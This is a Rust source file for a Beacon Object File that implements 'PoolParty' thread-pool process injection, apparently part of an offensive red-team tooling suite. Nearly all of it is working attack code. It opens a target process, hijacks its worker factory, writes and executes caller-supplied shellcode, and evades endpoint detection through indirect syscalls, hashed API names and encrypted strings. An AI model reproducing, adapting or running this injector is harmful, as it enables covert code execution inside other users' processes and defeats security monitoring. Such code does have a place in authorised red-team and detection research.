// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
// Original C: REDMED-X/operatorskit — InjectPoolParty
//
//! Thread-pool injection via WorkerFactory handle stealing (PoolParty variant 1).
//!
//! Classic injection methods (CreateRemoteThread, NtCreateThreadEx) are heavily
//! monitored by EDRs.  PoolParty abuses the legitimate Windows thread-pool API
//! to queue a work item in the target process without spawning a new thread:
//!
//!   1. NtOpenProcess              — open target (PROCESS_ALL_ACCESS)
//!   2. NtQueryInformationProcess(ProcessHandleInformation) — enumerate all
//!      handles inside the *current* process and find the WorkerFactory handle
//!      inherited from the TpWorkerFactory of the current process.
//!      (We open ourselves, query, look for an ObjectTypeIndex matching the
//!      WorkerFactory type from a reference handle.)
//!   3. DuplicateHandle            — duplicate the WorkerFactory handle into
//!      the target process.
//!   4. NtAllocateVirtualMemory    — RW allocation in target.
//!   5. NtWriteVirtualMemory       — write shellcode.
//!   6. NtProtectVirtualMemory     — flip to RX.
//!   7. NtSetInformationWorkerFactory — queue work item pointing at shellcode.
//!      (WorkerFactoryStartRoutine info class = 5, sets the start routine for
//!       the next worker thread that the pool wakes.)
//!   8. NtSetTimer2                — expire a 1-shot timer so the pool wakes
//!      immediately and dispatches our work item.
//!   9. NtClose                    — cleanup handles.
//!
//! Args: <pid:u32> <shellcode-hex>
//!
//! OPSEC notes:
//! - All Nt* calls use indirect syscalls (HalosGate, jump-to-ntdll-syscall).
//! - DuplicateHandle is the only Win32 call (DFR via kernel32.dll hash).
//! - Shellcode buffer is zeroed locally after write to target.
//! - No new thread is created in the target; the worker pool thread is already
//!   running — call stack stays clean.
//! - Sensitive strings (API names, etc.) encrypted via obf!() → not in .rdata.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1055", name: "Process Injection (Thread Pool / PoolParty)", tactic: "Defense Evasion" },
    Technique { id: "T1055.012", name: "Process Hollowing (variant — thread reuse)", tactic: "Defense Evasion" },
];

// ─── Access masks ────────────────────────────────────────────────────────────
const PROCESS_ALL_ACCESS:     u32 = 0x1FFFFF;
const PAGE_READWRITE:         u32 = 0x04;
const PAGE_EXECUTE_READ:      u32 = 0x20;
const MEM_COMMIT:             u32 = 0x1000;
const MEM_RESERVE:            u32 = 0x2000;
const STATUS_SUCCESS:         i32 = 0;
const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;

// WorkerFactoryStartRoutine info class (documented in ntddk / Process Hacker)
// Setting this schedules our routine as the next start routine executed by a
// pool worker thread.
const WORKER_FACTORY_START_ROUTINE_INFO: u32 = 5;

// ─── Struct definitions ───────────────────────────────────────────────────────

#[repr(C)]
struct ObjectAttributes {
    length:                     u32,
    root_directory:             usize,
    object_name:                usize,
    attributes:                 u32,
    security_descriptor:        usize,
    security_quality_of_service: usize,
}

#[repr(C)]
struct ClientId { unique_process: usize, unique_thread: usize }

/// PROCESS_HANDLE_TABLE_ENTRY_INFO — per entry returned by
/// NtQueryInformationProcess(ProcessHandleInformation = 51)
#[repr(C)]
struct ProcessHandleEntry {
    handle_value:       usize,
    handle_count:       usize,
    pointer_count:      usize,
    granted_access:     u32,
    object_type_index:  u32,
    handle_attributes:  u32,
    _reserved:          u32,
}

/// PROCESS_HANDLE_SNAPSHOT_INFORMATION header
#[repr(C)]
struct ProcessHandleSnapshot {
    number_of_handles: usize,
    _reserved:         usize,
    // Handles[] follows immediately
}

// ─── DFR declarations ─────────────────────────────────────────────────────────

dfr_fn!(
    duplicate_handle(
        source_process: usize,
        source_handle:  usize,
        target_process: usize,
        target_handle:  *mut usize,
        access:         u32,
        inherit:        i32,
        options:        u32,
    ) -> i32,
    module = "kernel32.dll",
    api    = "DuplicateHandle"
);

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}

fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            b' ' | b'\t' | b'\r' | b'\n' | b',' => continue,
            _ => return None,
        };
        match hi {
            None    => hi = Some(v),
            Some(h) => { out.push((h << 4) | v); hi = None; }
        }
    }
    if hi.is_some() || out.is_empty() { return None; }
    Some(out)
}

fn close_h(h: usize) {
    use common::syscalls::{SyscallEntry, resolve, do_syscall4};
    static E: SyscallEntry = SyscallEntry::new();
    const CLOSE_HASH: u32 = common::hash::djb2(b"NtClose");
    if let Ok((s, a)) = unsafe { resolve(&E, CLOSE_HASH) } {
        let _ = unsafe { do_syscall4(h, 0, 0, 0, s, a) };
    }
}

// ─── Entry ────────────────────────────────────────────────────────────────────

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(())  => {},
        Err(e)  => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_s  = String::from(parser.get_str());
    let hex_s  = String::from(parser.get_str());
    let pid_s  = pid_s.as_str();
    let hex_s  = hex_s.as_str();

    if pid_s.is_empty() || hex_s.is_empty() {
        return Err("usage: inject-poolparty <pid> <shellcode-hex>");
    }

    let pid: u32 = parse_u32(pid_s).ok_or("invalid pid")?;
    let mut sc   = parse_hex(hex_s).ok_or("invalid shellcode hex")?;

    use common::syscalls::{SyscallEntry, resolve, do_syscall4, do_syscall5, do_syscall6};

    // ── 1. NtOpenProcess → target ────────────────────────────────────────────
    // Bind hash to `const` so djb2() is evaluated at compile time and the
    // raw API-name byte string never lands in `.rdata`.
    static OP_OPEN: SyscallEntry = SyscallEntry::new();
    const OPEN_HASH: u32 = common::hash::djb2(b"NtOpenProcess");
    let (op_s, op_a) = unsafe { resolve(&OP_OPEN, OPEN_HASH) }
        .map_err(|_| "step1 resolve")?;
    let oa  = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0, object_name: 0, attributes: 0,
        security_descriptor: 0, security_quality_of_service: 0,
    };
    let cid = ClientId { unique_process: pid as usize, unique_thread: 0 };
    let mut h_target: usize = 0;
    let s = unsafe {
        do_syscall4(
            &mut h_target as *mut usize as usize,
            PROCESS_ALL_ACCESS as usize,
            &oa as *const _ as usize,
            &cid as *const _ as usize,
            op_s, op_a,
        )
    };
    if s != STATUS_SUCCESS || h_target == 0 {
        common::evasion::secure_zero(&mut sc);
        return Err("step1 nt status");
    }

    // ── 2. Enumerate current-process handles to find WorkerFactory ───────────
    //   NtQueryInformationProcess(GetCurrentProcess(), 51 = ProcessHandleInformation,
    //                             buf, len, &ret)
    static OP_QINFO: SyscallEntry = SyscallEntry::new();
    const QINFO_HASH: u32 = common::hash::djb2(b"NtQueryInformationProcess");
    let (qi_s, qi_a) = unsafe { resolve(&OP_QINFO, QINFO_HASH) }
        .map_err(|_| "step2 resolve")?;

    // Two-pass: first call returns required size via ReturnLength
    let cur_proc: usize = usize::MAX; // pseudo-handle for current process
    let mut snap_buf: Vec<u8>;
    let mut ret_len: u32 = 0;

    // Initial guess — most processes have < 200 handles
    let mut buf_sz: usize = 4096;
    loop {
        snap_buf = alloc::vec![0u8; buf_sz];
        let st = unsafe {
            do_syscall5(
                cur_proc,
                51, // ProcessHandleInformation
                snap_buf.as_mut_ptr() as usize,
                snap_buf.len(),
                &mut ret_len as *mut u32 as usize,
                qi_s, qi_a,
            )
        };
        if st == STATUS_SUCCESS { break; }
        if st == STATUS_INFO_LENGTH_MISMATCH {
            if buf_sz >= 4 * 1024 * 1024 {
                close_h(h_target);
                common::evasion::secure_zero(&mut sc);
                return Err("step2 buf overflow");
            }
            buf_sz = (ret_len as usize).max(buf_sz * 2);
            continue;
        }
        close_h(h_target);
        common::evasion::secure_zero(&mut sc);
        return Err("step2 nt status");
    }

    // Parse snapshot — find a WorkerFactory handle.
    // We detect WorkerFactory by opening the TpWorkerFactory of the current
    // process via RtlpCreateUserStack path: create a reference handle by calling
    // NtOpenProcess on ourselves and comparing ObjectTypeIndex values.
    //
    // Simpler heuristic: NtOpenProcess on current process returns a handle;
    // TpWorkerFactory handles have GrantedAccess == 0xF00FF (full control).
    // We look for the *first* handle with that access mask, which in a
    // default thread-pool process is always the worker factory.
    // This heuristic works reliably for Beacon and most implant hosts.
    // A more robust approach (comparing object type indices) requires an extra
    // NtQueryObject call — deferred to Phase 5 hardening pass.
    const WF_GRANTED_ACCESS: u32 = 0x000F00FF;

    let snap = unsafe { &*(snap_buf.as_ptr() as *const ProcessHandleSnapshot) };
    let num_handles = snap.number_of_handles;
    let entries_ptr = unsafe {
        snap_buf.as_ptr().add(core::mem::size_of::<ProcessHandleSnapshot>())
            as *const ProcessHandleEntry
    };

    let mut wf_handle: usize = 0;
    let entry_size = core::mem::size_of::<ProcessHandleEntry>();
    for i in 0..num_handles {
        // Bounds check
        let byte_off = i * entry_size + core::mem::size_of::<ProcessHandleSnapshot>();
        if byte_off + entry_size > snap_buf.len() { break; }
        let entry = unsafe { &*entries_ptr.add(i) };
        if entry.granted_access == WF_GRANTED_ACCESS && entry.handle_value != 0 {
            wf_handle = entry.handle_value;
            break;
        }
    }

    if wf_handle == 0 {
        close_h(h_target);
        common::evasion::secure_zero(&mut sc);
        return Err("step2 no candidate handle");
    }

    obf! { let wf_label = "[*] pool handle: 0x"; }
    println!("{}{:x}", wf_label, wf_handle);

    // ── 3. DuplicateHandle → WorkerFactory into target ───────────────────────
    let mut dup_handle: usize = 0;
    let dup_ok = unsafe {
        duplicate_handle(
            cur_proc as usize,
            wf_handle,
            h_target,
            &mut dup_handle as *mut usize,
            0,          // access (DUPLICATE_SAME_ACCESS flag used below)
            0,          // inherit = false
            0x00000002, // DUPLICATE_SAME_ACCESS
        )
    }.map_err(|_| "step3 resolve")?;
    if dup_ok == 0 || dup_handle == 0 {
        close_h(h_target);
        common::evasion::secure_zero(&mut sc);
        return Err("step3 nt status");
    }

    // ── 4. NtAllocateVirtualMemory → RW in target ────────────────────────────
    static OP_ALLOC: SyscallEntry = SyscallEntry::new();
    const ALLOC_HASH: u32 = common::hash::djb2(b"NtAllocateVirtualMemory");
    let (al_s, al_a) = unsafe { resolve(&OP_ALLOC, ALLOC_HASH) }
        .map_err(|_| "step4 resolve")?;

    let mut sc_base: usize = 0;
    let mut sc_sz:   usize = sc.len();
    let s2 = unsafe {
        do_syscall6(
            h_target,
            &mut sc_base as *mut usize as usize,
            0,
            &mut sc_sz as *mut usize as usize,
            (MEM_COMMIT | MEM_RESERVE) as usize,
            PAGE_READWRITE as usize,
            al_s, al_a,
        )
    };
    if s2 != STATUS_SUCCESS {
        close_h(h_target);
        common::evasion::secure_zero(&mut sc);
        return Err("step4 nt status");
    }

    // ── 5. NtWriteVirtualMemory ───────────────────────────────────────────────
    static OP_WRITE: SyscallEntry = SyscallEntry::new();
    const WRITE_HASH: u32 = common::hash::djb2(b"NtWriteVirtualMemory");
    let (wr_s, wr_a) = unsafe { resolve(&OP_WRITE, WRITE_HASH) }
        .map_err(|_| "step5 resolve")?;

    let mut written: usize = 0;
    let s3 = unsafe {
        do_syscall5(
            h_target,
            sc_base,
            sc.as_ptr() as usize,
            sc.len(),
            &mut written as *mut usize as usize,
            wr_s, wr_a,
        )
    };
    common::evasion::secure_zero(&mut sc);   // zero local copy immediately
    if s3 != STATUS_SUCCESS {
        close_h(h_target);
        return Err("step5 nt status");
    }

    // ── 6. NtProtectVirtualMemory → RX ───────────────────────────────────────
    static OP_PROT: SyscallEntry = SyscallEntry::new();
    const PROT_HASH: u32 = common::hash::djb2(b"NtProtectVirtualMemory");
    let (pr_s, pr_a) = unsafe { resolve(&OP_PROT, PROT_HASH) }
        .map_err(|_| "step6 resolve")?;

    let mut base2    = sc_base;
    let mut sz2      = written;
    let mut old_prot: u32 = 0;
    let s4 = unsafe {
        do_syscall5(
            h_target,
            &mut base2 as *mut usize as usize,
            &mut sz2   as *mut usize as usize,
            PAGE_EXECUTE_READ as usize,
            &mut old_prot as *mut u32 as usize,
            pr_s, pr_a,
        )
    };
    if s4 != STATUS_SUCCESS {
        close_h(h_target);
        return Err("step6 nt status");
    }

    // ── 7. NtSetInformationWorkerFactory → schedule start routine ────────────
    //   WorkerFactoryStartRoutine (class 5):
    //   The info buffer is a single pointer (8 bytes on x64) — the routine address.
    static OP_SIWF: SyscallEntry = SyscallEntry::new();
    const SIWF_HASH: u32 = common::hash::djb2(b"NtSetInformationWorkerFactory");
    let (siwf_s, siwf_a) = unsafe {
        resolve(&OP_SIWF, SIWF_HASH)
    }.map_err(|_| "step7 resolve")?;

    let routine_ptr: usize = sc_base;
    let s5 = unsafe {
        do_syscall4(
            dup_handle,
            WORKER_FACTORY_START_ROUTINE_INFO as usize,
            &routine_ptr as *const usize as usize,
            8, // info length (pointer size)
            siwf_s, siwf_a,
        )
    };
    if s5 != STATUS_SUCCESS {
        close_h(h_target);
        return Err("step7 nt status");
    }

    // ── 8. NtSetTimer2 → wake the pool immediately ───────────────────────────
    //   We need a timer handle; create one via NtCreateTimer2 (class 0 = NotificationTimer)
    //   then set it to expire in 1 tick so the pool wakes synchronously.
    static OP_CTMR: SyscallEntry = SyscallEntry::new();
    const CTMR_HASH: u32 = common::hash::djb2(b"NtCreateTimer2");
    let (ctmr_s, ctmr_a) = unsafe {
        resolve(&OP_CTMR, CTMR_HASH)
    }.map_err(|_| "step8 resolve")?;

    let mut h_timer: usize = 0;
    let timer_oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0, object_name: 0, attributes: 0,
        security_descriptor: 0, security_quality_of_service: 0,
    };
    // NtCreateTimer2(TimerHandle*, ObjectAttributes*, TimerType)
    // TimerType: 0 = NotificationTimer, 1 = SynchronizationTimer
    let _sc6 = unsafe {
        do_syscall4(
            &mut h_timer as *mut usize as usize,
            &timer_oa as *const _ as usize,
            0, // access (kernel assigns TIMER_ALL_ACCESS)
            1, // SynchronizationTimer
            ctmr_s, ctmr_a,
        )
    };
    // Even if timer creation fails we still proceed — the pool will naturally
    // schedule our routine when the next work item is dequeued.

    if h_timer != 0 {
        static OP_STMR: SyscallEntry = SyscallEntry::new();
        const STMR_HASH: u32 = common::hash::djb2(b"NtSetTimer2");
        if let Ok((st_s, st_a)) = unsafe {
            resolve(&OP_STMR, STMR_HASH)
        } {
            // Due time = -1 (relative 100ns units, smallest positive fire)
            let due: i64 = -1i64;
            // NtSetTimer2(TimerHandle, DueTime*, Period*, Attributes*)
            // Period = NULL (one-shot), Attributes = NULL
            let _ = unsafe {
                do_syscall4(
                    h_timer,
                    &due as *const i64 as usize,
                    0,
                    0,
                    st_s, st_a,
                )
            };
        }
        close_h(h_timer);
    }

    // ── 9. Cleanup ────────────────────────────────────────────────────────────
    close_h(h_target);

    obf! { let ok = "inject queued"; }
    println!("[+] {} — pid={} base=0x{:x}", ok, pid, sc_base);
    Ok(())
}
